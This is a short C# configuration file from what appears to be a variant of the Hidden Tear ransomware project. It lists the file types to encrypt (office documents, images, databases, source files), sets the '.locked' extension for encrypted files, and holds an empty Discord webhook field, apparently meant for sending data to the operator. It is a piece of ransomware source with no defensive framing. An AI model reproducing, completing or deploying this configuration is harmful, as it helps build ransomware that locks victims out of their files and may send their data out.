using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace hidden_tear.Tools
{
    internal class Config
    {
        public static string[] extensionToEncrypt = new string[] { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd" };
        public static string DiscordWebhook = "";
        public static string encryptedExtension = ".locked";

    }
}